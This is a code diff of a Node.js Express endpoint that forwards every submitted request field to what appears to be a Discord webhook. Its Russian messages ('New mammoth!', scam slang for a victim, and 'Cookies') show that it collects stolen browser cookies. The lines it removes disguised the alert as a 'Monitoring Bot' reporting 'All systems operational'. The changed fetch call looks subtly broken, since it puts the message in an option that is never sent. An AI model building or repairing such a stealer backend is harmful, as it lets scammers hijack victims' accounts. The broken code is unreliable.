@@ -18,18 +18,6 @@ app.post('/send', async (req, res) => {
         const reqBody = req.body;
         const fieldsArray = [];
         let index = 0;
-        let embed = {
-            title: "Новый мамонт!",
-            description: "All systems operational",
-            color: 5763719, // Green
-            fields: [
-              
-            ],
-            footer: {
-              text: "Monitoring Bot"
-            },
-            timestamp: new Date().toISOString()
-        };
         console.log(reqBody);
         for (const key in reqBody) {
             if (Object.prototype.hasOwnProperty.call(reqBody, key)) {
@@ -37,7 +25,7 @@ app.post('/send', async (req, res) => {
                 //name: "Memory",
                 //value: "4.2 GB / 16 GB",
                 //inline: true
-                embed.fields.push({ name: key, value: reqBody[key], inline: true });
+                fieldsArray.push(reqBody[key]);
                 console.log(reqBody[key],index);
             }
         }
@@ -46,7 +34,7 @@ app.post('/send', async (req, res) => {
             headers: {
               "Content-Type": "application/json"
             },
-            body: JSON.stringify({ embeds: [embed] })
+            content: `Новый мамонт! \n Куки: ${fieldsArray.concat("\n \n")}`
         });
         console.log(response);
         // Формируем правильную структуру для Discord
